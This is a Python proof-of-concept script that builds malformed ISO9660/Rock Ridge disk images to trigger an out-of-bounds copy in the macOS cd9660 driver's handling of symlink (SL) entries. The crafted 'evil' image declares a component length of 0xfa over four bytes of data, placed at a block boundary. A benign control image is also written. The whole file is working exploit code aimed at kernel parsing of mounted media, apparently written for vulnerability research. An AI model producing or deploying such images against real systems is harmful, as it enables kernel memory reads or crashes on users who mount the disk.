#!/usr/bin/env python3
"""
Build a minimal ISO9660/Rock Ridge image for the macOS 27 cd9660 RRIP "SL"
source-bound bug.

Default output:
  ~/cd9660_sl_poc/sl_evil.iso    - SL component len byte is 0xfa, data is "AAAA"
  ~/cd9660_sl_poc/sl_benign.iso  - same layout, SL component len byte is 4

The malicious "badlink" directory record is placed so the SL entry's legitimate
component data ("AAAA") is the final four bytes of the 2048-byte root-directory
block. A declared component length larger than four makes cd9660 copy past the
SL entry/source block while the destination length remains below the 0x400 cap.
"""

import argparse
import os
import struct
from pathlib import Path

SECT = 2048
TOTAL_SECTORS = 64

PVD_LBA = 16
TERM_LBA = 17
PATH_L_LBA = 18
ROOT_LBA = 19
PATH_M_LBA = 20
SYMLINK_EXTENT_LBA = 21

ROOT_SIZE = SECT
S_IFLNK = 0o120000


def both16(v):
    return struct.pack("<H", v) + struct.pack(">H", v)


def both32(v):
    return struct.pack("<I", v) + struct.pack(">I", v)


def dt7():
    return bytes([126, 6, 21, 0, 0, 0, 0])


def dirrec(name, extent_lba, data_len, flags, susp=b""):
    body = bytearray()
    body += b"\x00"              # [0] directory-record length, filled below
    body += b"\x00"              # [1] extended-attribute-record length
    body += both32(extent_lba)    # [2:10] extent location
    body += both32(data_len)      # [10:18] data length
    body += dt7()                 # [18:25] recording date/time
    body += bytes([flags])        # [25] file flags; bit 1 = directory
    body += b"\x00"              # [26] file unit size
    body += b"\x00"              # [27] interleave gap size
    body += both16(1)             # [28:32] volume sequence number
    body += bytes([len(name)])    # [32] file identifier length
    body += name

    # ISO9660 pads the file identifier so System Use begins on an even offset.
    if len(body) & 1:
        body += b"\x00"

    body += susp

    # Keep directory records even-sized except where the caller's SUSP parity
    # already makes the final record exact. macOS cd9660 has no even-reclen gate,
    # but even records make filler placement deterministic.
    if len(body) & 1:
        body += b"\x00"

    if len(body) > 255:
        raise ValueError(f"directory record too large: {len(body)}")
    body[0] = len(body)
    return bytes(body)


def susp_sp():
    # SUSP "SP": signature, len=7, version=1, check bytes 0xbe 0xef, LEN_SKP=0.
    return b"SP" + bytes([7, 1, 0xBE, 0xEF, 0])


def susp_er():
    # RRIP extension reference. macOS requires this before it switches to RR mode.
    return b"ER" + bytes([0x12, 1, 0x0A, 0, 0, 1]) + b"RRIP_1991A"


def susp_rr():
    # RRIP flags: PX present (bit 0) and SL present (bit 2).
    return b"RR" + bytes([5, 1, 0x05])


def susp_px(mode):
    # Apple cd9660's PX handler only needs the POSIX mode at PX+4. The local
    # disassembly notes use the 0x24-byte four-field form accepted by this parser.
    return (
        b"PX"
        + bytes([0x24, 1])
        + both32(mode)
        + both32(1)
        + both32(0)
        + both32(0)
    )


def susp_sl(marker, declared_len):
    if not (0 <= declared_len <= 0xFF):
        raise ValueError("SL component length must fit in one byte")
    if len(marker) > 0xF0:
        raise ValueError("marker is unexpectedly large")
    component = bytes([0, declared_len]) + marker
    entry = b"SL" + bytes([5 + len(component), 1, 0]) + component
    if len(entry) > 0xFF:
        raise ValueError("SL entry too large")
    return entry


def path_table(le=True):
    rec = bytearray()
    rec += bytes([1, 0])
    rec += struct.pack("<I" if le else ">I", ROOT_LBA)
    rec += struct.pack("<H" if le else ">H", 1)
    rec += b"\x00"
    rec += b"\x00"
    return bytes(rec)


def filler_record(size, index):
    if size < 34 or size > 254 or size & 1:
        raise ValueError(f"invalid filler size {size}")
    name_len = size - 33
    name = (f"F{index:06d}".encode("ascii")).ljust(name_len, b"A")[:name_len]
    rec = dirrec(name, SYMLINK_EXTENT_LBA + 1 + index, 0, 0)
    if len(rec) != size:
        raise AssertionError((size, len(rec), name_len))
    return rec


def fill_gap_exact(rootblk, offset, gap):
    index = 0
    while gap:
        if gap < 34:
            raise ValueError(f"unfillable directory-record gap {gap}")
        size = min(254, gap)
        if 0 < gap - size < 34:
            size -= 34
        if size & 1:
            size -= 1
        rec = filler_record(size, index)
        rootblk[offset:offset + len(rec)] = rec
        offset += len(rec)
        gap -= len(rec)
        index += 1
    return offset, index


def build_image(out_path, evil=True, marker=b"AAAA", overlen=0xFA):
    declared_len = overlen if evil else len(marker)
    if declared_len + 1 > 0x400:
        raise ValueError("declared SL component length would exceed readlink cap")

    img = bytearray(SECT * TOTAL_SECTORS)

    sl = susp_sl(marker, declared_len)
    bad_susp = susp_px(S_IFLNK | 0o777) + susp_rr() + sl
    badlink = dirrec(b"badlink", SYMLINK_EXTENT_LBA, 0, 0, bad_susp)

    dot = dirrec(b"\x00", ROOT_LBA, ROOT_SIZE, 0x02, susp_sp() + susp_er())
    dotdot = dirrec(b"\x01", ROOT_LBA, ROOT_SIZE, 0x02)

    rootblk = bytearray(SECT)
    off = 0
    rootblk[off:off + len(dot)] = dot
    off += len(dot)
    rootblk[off:off + len(dotdot)] = dotdot
    off += len(dotdot)

    badlink_start = SECT - len(badlink)
    if badlink_start < off:
        raise ValueError("badlink record does not fit")
    off, filler_count = fill_gap_exact(rootblk, off, badlink_start - off)
    rootblk[off:off + len(badlink)] = badlink
    off += len(badlink)

    if off != SECT:
        raise AssertionError(f"badlink does not end at block boundary: {off}")
    if rootblk[-len(sl):] != sl:
        raise AssertionError("SL entry is not the final SUSP field")
    if rootblk[-len(marker):] != marker:
        raise AssertionError("marker is not at the source block boundary")

    img[ROOT_LBA * SECT:(ROOT_LBA + 1) * SECT] = rootblk

    pt_l = path_table(True)
    pt_m = path_table(False)
    img[PATH_L_LBA * SECT:PATH_L_LBA * SECT + len(pt_l)] = pt_l
    img[PATH_M_LBA * SECT:PATH_M_LBA * SECT + len(pt_m)] = pt_m

    pvd = bytearray(SECT)
    pvd[0] = 1
    pvd[1:6] = b"CD001"
    pvd[6] = 1
    pvd[8:40] = b" " * 32
    pvd[40:72] = b"CD9660_SL_POC".ljust(32)
    pvd[80:88] = both32(TOTAL_SECTORS)
    pvd[120:124] = both16(1)
    pvd[124:128] = both16(1)
    pvd[128:132] = both16(SECT)
    pvd[132:140] = both32(len(pt_l))
    pvd[140:144] = struct.pack("<I", PATH_L_LBA)
    pvd[144:148] = struct.pack("<I", 0)
    pvd[148:152] = struct.pack(">I", PATH_M_LBA)
    pvd[152:156] = struct.pack(">I", 0)
    pvd_root = dirrec(b"\x00", ROOT_LBA, ROOT_SIZE, 0x02)
    if len(pvd_root) != 34:
        raise AssertionError(len(pvd_root))
    pvd[156:156 + len(pvd_root)] = pvd_root
    pvd[881] = 1
    img[PVD_LBA * SECT:(PVD_LBA + 1) * SECT] = pvd

    term = bytearray(SECT)
    term[0] = 0xFF
    term[1:6] = b"CD001"
    term[6] = 1
    img[TERM_LBA * SECT:(TERM_LBA + 1) * SECT] = term

    out_path = Path(out_path).expanduser()
    out_path.parent.mkdir(parents=True, exist_ok=True)
    out_path.write_bytes(img)

    kind = "evil" if evil else "benign"
    print(
        f"{kind}: wrote {out_path} ({len(img)} bytes); "
        f"badlink_start={badlink_start}, badlink_len={len(badlink)}, "
        f"SL_len={len(sl)}, comp_len=0x{declared_len:02x}, "
        f"marker={marker!r}, fillers={filler_count}"
    )


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", default="~/cd9660_sl_poc")
    ap.add_argument("--marker", default="AAAA")
    ap.add_argument("--overlen", default="0xfa")
    ap.add_argument("--only", choices=["all", "evil", "benign"], default="all")
    args = ap.parse_args()

    out_dir = Path(os.path.expanduser(args.out_dir))
    marker = args.marker.encode("ascii")
    overlen = int(args.overlen, 0)

    if args.only in ("all", "evil"):
        build_image(out_dir / "sl_evil.iso", True, marker, overlen)
    if args.only in ("all", "benign"):
        build_image(out_dir / "sl_benign.iso", False, marker, overlen)


if __name__ == "__main__":
    main()
